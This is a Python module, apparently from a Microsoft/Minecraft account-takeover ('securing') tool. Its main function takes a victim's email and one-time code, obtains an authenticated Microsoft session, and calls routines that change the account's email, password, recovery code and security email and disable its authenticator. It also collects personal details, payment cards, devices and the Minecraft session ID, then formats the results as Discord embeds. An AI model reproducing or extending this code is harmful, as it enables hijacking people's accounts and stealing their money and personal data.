from securing.utils.cookies.get_livedata import livedata
from securing.build_embeds import build_account_embeds
from securing.auth.initial_session import get_session
from securing.utils.polish_host import polish_host
from securing.auth.get_msaauth import get_msaauth
from securing.utils.secure import secure
import httpx
import time

async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None, recovery: bool = True, ppft: str = None, rextra: dict = None):
    # Handles the data to be displayed in embeds to discord
    
    session = get_session()
    
    print(f"Got 1")
    data = await livedata(session)
    msaauth = await get_msaauth(session, email, device, data, code, ppft)
    
    account = {
        "microsoft": {
            "email": "Couldn't Change!",
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": "Couldn't Change!",
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get",
            "language": "Failed to Get",
            "family": [],
            "devices": [],
            "cards": [],
            "subscriptions": {
                "active": [], 
                "canceled": [], 
                "commercial": []
            }
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False
        }
    }

    initialTime = time.time()
    if not msaauth:
        return msaauth
    
    if rextra:
        account["password"] = rextra["password"]
        account["security_email"] = rextra["security_email"]
        account["recovery_code"] = rextra["recovery_code"]
    
    match msaauth:
        case "Recovery":
            print(f"[X] - Account requires account recovery")
            return None
        
        case "Family":
            print(f"[X] - Account is Family Locked")
            account["minecraft"]["name"] = "Child Locked"
            account["microsoft"]["email"] = "Child Locked"
            account["microsoft"]["security_email"] = "Child Locked"
            
        case _:
            print(f"[+] - Got MSAAUTH")
            await polish_host(session, msaauth)
            print(f"[~] - Polished MSAAUTH")
            account = await secure(
                session = session, 
                recovery = recovery,
                accountInfo = account
            )

    finalTime = (time.time() - initialTime)

    account = await build_account_embeds(account, finalTime)
    return account